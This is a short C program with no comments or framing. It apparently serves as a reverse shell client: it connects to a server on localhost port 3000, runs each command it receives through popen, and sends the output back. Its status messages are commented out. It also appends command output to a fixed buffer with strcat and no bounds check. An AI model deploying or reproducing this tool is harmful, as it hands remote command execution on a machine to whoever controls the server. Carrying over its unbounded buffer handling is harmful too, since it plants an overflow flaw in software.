#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

#define PORT 3000
#define BUFFER_SIZE 1024

void error(const char *msg) {
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[]) {
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];

    portno = PORT;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");

    server = gethostbyname("localhost");
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, 
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);

    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");

    //printf("Connected to server. Waiting for commands...\n");

    while (1) {
        bzero(buffer, BUFFER_SIZE);
        n = read(sockfd, buffer, BUFFER_SIZE - 1);
        if (n < 0) error("ERROR reading from socket");
        if (n == 0) {
            printf("Server closed the connection.\n");
            break;
        }

        //printf("Command from server: %s\n", buffer);

        if (strncmp(buffer, "cd ", 3) == 0) {
            if (chdir(buffer + 3) == 0) {
                strcpy(output, "Directory changed successfully");
            } else {
                strcpy(output, "Failed to change directory");
            }
        } else {
            FILE *fp = popen(buffer, "r");
            if (fp == NULL) {
                strcpy(output, "Error executing command");
            } else {
                bzero(output, BUFFER_SIZE);
                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
                    strcat(output, buffer);
                }
                pclose(fp);
            }
        }

        n = write(sockfd, output, strlen(output));
        if (n < 0) error("ERROR writing to socket");
    }

    close(sockfd);
    return 0;
}
